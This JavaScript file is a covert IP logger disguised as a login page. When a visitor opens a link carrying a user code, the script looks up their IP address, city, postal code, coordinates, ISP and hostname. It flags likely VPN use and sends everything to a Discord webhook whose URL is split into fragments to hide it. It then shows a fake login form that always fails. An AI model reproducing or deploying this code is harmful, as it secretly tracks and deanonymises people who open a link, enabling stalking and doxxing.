let user
let vpnList = {}

if (window.location.search.includes('?user=')) {
  user = window.location.search.replace('?user=','')
}
let hook = 'cord.com/ap'
hook = 'https://dis' + hook;
hook += 'i/webho'
hook += 'oks/1080710292427776020/fQCyjzj8IEJcNETvvjwGSTotiAXtoBYyUAmJyiz7QEnih9_nFfk8hVxqBwYY8We0DLUJ'


fetch('./vpns.json')
.then((response) => response.json())
.then((json) => vpnList = json);

if (user) {
  $.getJSON("https://ipinfo.io/json", function(data) {
    console.log(data);
    var params = {
      embeds: [
        {
          "title": "Logged Someone",
          "color": 15258703,
          "thumbnail": {
          },
          "fields": [
            {
              "name": "Timestamp",
              "value": `> ${Date.now()}`
            },
            {
              "name": "Given Code",
              "value": `> ${user}`
            },
            {
              "name": "IP Address",
              "value": `>>> ${data.ip} ${
                (Object.keys(vpnList).includes(data.ip) ? '\n\n🚩 This IP might be a VPN. \nConfidence: '+vpnList[data.ip] : '')
              }`
            },
            {
              "name": "GeoLocation Info",
              "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
            },
            {
              "name": "Network Info",
              "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
            }
          ]
        }
      ]
    }
    fetch(hook, {
      method: "POST",
      headers: {
          'Content-type': 'application/json'
      },
      body: JSON.stringify(params)
    }).then(res => {
      console.log(res);
      // console.log(JSON.parse('vpns.json'));
      setTimeout(
        ()=>{
          document.body.innerHTML = `
          <div>
          <h2>Login</h2>
          Username: <input type="text" value=${user}><br>
          Password: <input type="text"><br>
          <button onclick="alert('Invalid username or password')">Submit</button>
          </div>
          `
        },Math.random()*1000
      )
    })
  })
}
